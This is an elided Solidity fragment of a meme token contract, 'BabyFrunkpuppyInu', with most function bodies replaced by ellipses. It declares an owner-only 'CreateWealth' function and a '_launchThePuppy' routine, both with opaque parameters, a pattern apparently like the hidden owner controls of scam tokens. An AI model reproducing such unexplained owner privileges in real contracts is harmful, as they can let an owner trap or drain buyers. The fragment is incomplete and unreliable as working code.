...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _launchThePuppy(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
    ...
    function CreateWealth(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
...
contract ERC20Frunkpuppy is Context, ERC20 {
    constructor(
        ...
        _launchThePuppy(owner, initialSupply, tmp6, tmp7);
    }
}

contract BabyFrunkpuppyInu is ERC20Frunkpuppy {
    constructor() ERC20Frunkpuppy("BabyFrunkpuppyInu", "BABYFRUNK", false, true, 800, 25, msg.sender, 500000000000 * 10 ** 18, msg.sender, 15) {
    }
}